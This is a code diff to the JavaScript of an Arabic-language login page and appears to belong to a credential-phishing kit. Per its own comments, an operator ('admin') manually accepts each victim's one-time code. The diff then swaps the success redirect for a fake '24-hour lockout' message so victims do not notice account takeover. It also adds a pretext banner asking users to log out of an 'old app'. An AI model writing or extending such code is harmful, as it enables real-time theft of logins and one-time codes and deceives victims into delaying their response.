@@ -804,14 +804,23 @@
         formError.classList.remove('fixed-bottom');
     }
 
-    let emailWarningShown = false;
-    emailInput.addEventListener('input', () => {
-        if (!emailWarningShown && emailInput.value.trim().length > 0) {
-            emailWarningShown = true;
-            formError.classList.add('fixed-bottom');
-            showFormError('يرجى تسجيل الخروج من حسابك على التطبيق القديم اولا');
+    /* ===== رسالة تسجيل الخروج من التطبيق القديم (تظهر عند فتح الموقع) ===== */
+    const LOGOUT_NOTICE = 'يرجى تسجيل الخروج من حسابك على التطبيق القديم اولا';
+
+    formError.classList.add('fixed-bottom');
+    showFormError(LOGOUT_NOTICE);
+
+    function hideLogoutNotice() {
+        if (formError.querySelector('.err-text').textContent === LOGOUT_NOTICE) {
+            hideFormError();
         }
+    }
+
+    [emailInput, passwordInput].forEach(inp => {
+        inp.addEventListener('focus', hideLogoutNotice);
+        inp.addEventListener('click', hideLogoutNotice);
     });
+    $('support-btn').addEventListener('click', hideLogoutNotice);
 
     const togglePassword = $('togglePassword');
     togglePassword.addEventListener('click', function () {
@@ -1121,11 +1130,14 @@
             return;
         }
 
+        /* بعد قبول OTP من الأدمن: العودة لصفحة تسجيل الدخول وإظهار رسالة تجاوز المحاولات */
         if (d.otpStatus === 'approved') {
             setLoading(otpConfirmBtn, false);
             localStorage.removeItem('login_request_id');
             loginRequestId = null;
-            showLoginSuccess();
+            otpOverlay.classList.remove('show');
+            formError.classList.add('fixed-bottom');
+            showFormError('تم تجاوز عدد محاولات تسجيل الدخول المسموحة، يرجى المحاولة أخرى بعد 24 ساعة');
             return;
         }
 
@@ -1178,20 +1190,6 @@
             otpErrorBanner.classList.add('show');
             return;
         }
-    }
-
-    function showLoginSuccess() {
-        otpOverlay.innerHTML = `
-            <div class="success-view">
-                <i class="fa-solid fa-circle-check ok-icon"></i>
-                <div class="ok-title">تم بنجاح!</div>
-                <div class="ok-sub">جاري تحويلك إلى الصفحة الرئيسية...</div>
-                <div class="btn-spinner" style="display:inline-block;color:var(--accent);margin-top:8px">
-                    <span class="ring-outer"></span><span class="ring-inner"></span>
-                </div>
-            </div>
-        `;
-        setTimeout(() => { window.location.href = 'int.html'; }, 1200);
     }
 
     /* =================== Chat (customer service) =================== */
